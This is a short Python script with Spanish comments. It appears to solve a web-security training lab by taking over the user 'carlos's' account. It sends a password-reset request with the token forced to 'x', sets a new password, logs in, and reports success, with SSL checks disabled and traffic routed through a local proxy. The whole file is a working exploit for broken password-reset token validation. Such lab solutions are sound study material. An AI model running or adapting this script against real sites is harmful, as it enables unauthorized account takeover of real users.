import requests
import sys
import urllib3

# Ignora las advertencias de certificados SSL no verificados.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración de proxies para interceptar las peticiones.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):
    
    print("[+] Restableciendo la contraseña de Carlos...")
    password_reset_url = f"{url}/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {"temp-forgot-password-token": "x", "username": "carlos", "new-password-1": "password", "new-password-2": "password"}
    s.post(password_reset_url, data=password_reset_data, verify=False, proxies=proxies)

 
    print("[+] Iniciando sesión en la cuenta de Carlos...")
    login_url = f"{url}/login"
    login_data = {"username": "carlos", "password": "password"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    # Verifica si el inicio de sesión fue exitoso.
    if "Log out" in r.text:
        print("[+] Inicio de sesión exitoso en la cuenta de Carlos.")
    else:
        print("(-) El exploit falló.")
        sys.exit(-1)  # Finaliza el script si el inicio de sesión falló.

def main():
    # Verifica que se haya proporcionado la URL como argumento.
    if len(sys.argv) != 2:
        print("[+] Uso: %s <url>" % sys.argv[0])
        print("[+] Ejemplo: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    # Crea una sesión de requests y realiza las operaciones.
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()
